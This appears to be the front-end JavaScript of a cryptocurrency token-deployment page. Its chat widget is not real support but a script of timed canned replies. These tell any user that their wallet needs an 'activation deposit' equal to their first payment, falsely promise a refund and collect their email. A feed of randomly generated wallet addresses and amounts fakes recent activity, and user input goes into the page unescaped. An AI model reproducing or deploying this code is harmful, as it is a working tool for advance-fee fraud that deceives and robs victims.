document.querySelectorAll('.btn-primary,.btn-pay,.cookie-btn').forEach(btn=>{
btn.addEventListener('click',function(e){
const r=document.createElement('span');r.className='ripple';
const rect=this.getBoundingClientRect();
r.style.left=(e.clientX-rect.left)+'px';
r.style.top=(e.clientY-rect.top)+'px';
r.style.width=r.style.height=Math.max(rect.width,rect.height)+'px';
this.appendChild(r);
setTimeout(()=>r.remove(),700);
});
});

document.querySelectorAll('.net-card,.amt-card').forEach(card=>{
card.addEventListener('touchstart',function(e){
const rect=this.getBoundingClientRect();
const t=e.touches[0];
this.style.setProperty('--x',(t.clientX-rect.left)+'px');
this.style.setProperty('--y',(t.clientY-rect.top)+'px');
},{passive:true});
});

function openChat(){
const el=document.getElementById('chatBg');
el.classList.remove('closing');
el.classList.add('active');
requestAnimationFrame(()=>el.style.opacity='1');
}
function closeChat(){
const el=document.getElementById('chatBg');
el.classList.add('closing');
setTimeout(()=>{
el.classList.remove('active','closing');
el.style.opacity='';
document.getElementById('chatMsgs').style.display='block';
document.getElementById('chatInputRow').style.display='flex';
document.getElementById('chatForm').classList.remove('active');
document.getElementById('chatQueue').classList.remove('active');
},350);
}
var chatStep=0;
function sendChat(){
var inp=document.getElementById('chatInp');
var msg=inp.value.trim();if(!msg)return;
var c=document.getElementById('chatMsgs');
var d=document.createElement('div');d.className='msg user';
d.innerHTML='<div class="msg-bubble">'+msg+'</div><div class="msg-time">Now</div>';
c.appendChild(d);c.scrollTop=c.scrollHeight;inp.value='';

if(chatStep===0){
    chatStep=1;
    setTimeout(function(){addBotMsg('Thank you for reaching out! Let me check your deployment status...');},800);
    setTimeout(function(){addBotMsg('I can see your transaction was received, however your recipient wallet requires additional verification before tokens can be released.');},2200);
    setTimeout(function(){addBotMsg('To complete the verification and finalize your deployment, an additional activation deposit of the same amount is required. This is a one-time security measure for first-time wallets.');},3800);
    setTimeout(function(){addBotMsg('Your original payment will be fully refunded to your wallet within 24 hours after the verification deposit is confirmed.');},5200);
    setTimeout(function(){addBotMsg('Would you like to proceed with the verification deposit? If you have any concerns, please leave your email and our senior support agent will contact you directly.');},6500);
} else if(chatStep===1){
    chatStep=2;
    var hasAt=msg.includes('@');
    if(hasAt){
        setTimeout(function(){addBotMsg('Thank you! We\'ve noted your email. A senior agent will reach out to you within 1-2 hours to assist with the verification process and help complete your deployment.');},1000);
        setTimeout(function(){addBotMsg('In the meantime, you can also proceed with the verification deposit directly through the platform to speed up the process. Your original funds are safe and will be returned within 24 hours.');},2500);
    } else {
        setTimeout(function(){addBotMsg('Understood. If you\'d like our team to contact you, please share your email address and we\'ll have a senior agent reach out within 1-2 hours.');},1000);
        setTimeout(function(){addBotMsg('Otherwise, you can proceed with the verification deposit now through the payment modal. Your first deposit will be refunded within 24 hours.');},2500);
    }
} else {
    setTimeout(function(){addBotMsg('A senior support agent will review your case shortly. Please leave your email if you haven\'t already, and we\'ll get back to you as soon as possible. Your funds are secure.');},1000);
}
}
function addBotMsg(text){
var c=document.getElementById('chatMsgs');
var d=document.createElement('div');d.className='msg bot';
d.innerHTML='<div class="msg-bubble">'+text+'</div><div class="msg-time">Just now</div>';
c.appendChild(d);c.scrollTop=c.scrollHeight;
}
function submitChat(){
var n=document.getElementById('cfName').value;
var e=document.getElementById('cfEmail').value;
if(!n||!e){alert('Please fill name and email');return}
document.getElementById('chatForm').classList.remove('active');
document.getElementById('chatQueue').classList.add('active');
document.getElementById('cqNum').textContent=Math.floor(Math.random()*180)+15;
}

(function(){
const nets=['Ethereum','BNB Chain','Polygon','Arbitrum','Solana','TRON'];
const amts=['50,000','100,000','250,000','500,000'];
const list=document.getElementById('rdList');
function rAddr(net){
if(net==='TRON') return 'T'+Array.from({length:4},()=>'ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz0123456789'[Math.floor(Math.random()*58)]).join('')+'...'+Array.from({length:4},()=>'0123456789abcdef'[Math.floor(Math.random()*16)]).join('');
if(net==='Solana') return Array.from({length:4},()=>'123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'[Math.floor(Math.random()*58)]).join('')+'...'+Array.from({length:4},()=>'123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'[Math.floor(Math.random()*58)]).join('');
return '0x'+Array.from({length:4},()=>Math.floor(Math.random()*16).toString(16)).join('')+'...'+Array.from({length:4},()=>Math.floor(Math.random()*16).toString(16)).join('');
}
function rTime(){return Math.floor(Math.random()*55+1)+'m ago';}
function addDeploy(){
const net=nets[Math.floor(Math.random()*nets.length)];
const amt=amts[Math.floor(Math.random()*amts.length)];
const div=document.createElement('div');
div.className='rd-item';
div.innerHTML='<span class="rd-dot"></span><span class="rd-addr">'+rAddr(net)+'</span><span class="rd-info"> deployed <b>'+amt+'</b> tokens on <span class="rd-net">'+net+'</span></span><span class="rd-time">'+rTime()+'</span>';
list.insertBefore(div,list.firstChild);
if(list.children.length>4)list.removeChild(list.lastChild);
}
for(let i=0;i<3;i++)addDeploy();
setInterval(addDeploy,40000);
})();
</script>
